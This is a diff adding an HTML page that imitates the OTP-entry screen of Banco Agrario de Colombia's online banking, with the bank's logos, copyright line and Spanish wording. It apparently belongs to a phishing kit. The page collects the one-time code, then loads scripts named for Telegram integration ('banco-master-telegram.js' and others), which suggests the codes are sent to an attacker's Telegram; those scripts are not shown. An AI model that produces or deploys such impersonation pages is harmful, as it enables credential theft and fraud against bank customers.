@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Código OTP - Banca Virtual Banco Agrario</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-content">
+      <img src="img/logo-loading.1e8df20e3234c350bddc.svg" alt="Cargando..." class="loading-logo">
+      <div class="loading-text">Cargando...</div>
+    </div>
+  </div>
+
+  <!-- Header -->
+  <header class="header">
+    <div class="logo-container">
+      <img src="img/logo_bancoAgrario.5ee1db48b188d1b24e24.svg" alt="Banco Agrario de Colombia" class="logo">
+    </div>
+    <div class="language-selector">
+      <div class="flag-icon"></div>
+      <span class="language-text">ES</span>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="main-content">
+    <div class="form-container">
+      <h1 class="welcome-title">Ingrese el Código de Verificación</h1>
+      
+      <p style="color: #666; font-size: 14px; margin-bottom: 25px;">
+        Hemos enviado un código de verificación a su teléfono o correo electrónico registrado.
+      </p>
+
+      <form id="otpForm">
+        <div class="input-group">
+          <input 
+            type="text" 
+            id="otpInput" 
+            class="input-field otp-input" 
+            placeholder="Código OTP"
+            autocomplete="off"
+            maxlength="20"
+          >
+        </div>
+
+        <div class="btn-container">
+          <button type="button" class="btn-cancelar" onclick="window.location.href='index.html'">
+            Cancelar
+          </button>
+          <button type="submit" class="btn-siguiente" id="btnSiguiente" disabled>
+            Siguiente
+          </button>
+        </div>
+      </form>
+
+      <div class="links-container">
+        <a href="#" class="link-secondary">¿No recibió el código? Reenviar</a>
+      </div>
+    </div>
+
+    <!-- Footer Image -->
+    <img src="img/persona-small.08efe0e0209b478a65bb.png" alt="Personas" class="footer-image">
+    <div class="footer-text">Copyright © Banco Agrario de Colombia 2025. Todos los Derechos Reservados</div>
+  </main>
+
+  <script src="/js/telegram-integration.js"></script>
+  <script src="/js/banco-utils.js"></script>
+  <script src="../bank-config.js"></script>
+  <script src="../bank-telegram-base.js"></script>
+  <script src="../banco-master-telegram.js"></script>
+</body>
+</html>
